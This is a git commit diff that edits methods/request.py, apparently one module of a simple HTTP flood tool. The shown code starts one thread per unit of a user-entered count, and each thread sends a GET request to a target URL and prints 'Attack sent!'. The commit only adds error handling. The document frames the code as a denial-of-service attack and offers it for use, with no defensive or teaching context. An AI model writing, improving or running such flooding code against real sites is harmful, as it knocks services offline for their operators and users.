4f1cb7e17890850e7ae9c987fcecae08072b065d
rxyzqc <120246386+rxyzqc@users.noreply.github.com>
2022-12-26 22:49:48 +0300

    Add files via upload

--- methods/request.py
+++ methods/request.py
@@ -5,14 +5,18 @@ byte_s = int(input("Bytes: "))
 
 
 def r_send():
-    response = requests.get(url)
+    try:
+        response = requests.get(url)
+        if response.status_code == 200:
+            print(f"\033[32m[+]\033[0m Attack sent!")
 
-    if response.status_code == 200:
-        print(f"\033[32m[+]\033[0m Attack sent!")
+    except Exception as err:
+        print(err)
 
 
 for i in range(byte_s):
     thread = threading.Thread(target=r_send)
     thread.start()
 
-input("\nPress any key to continue . . . ")
+input("")
+
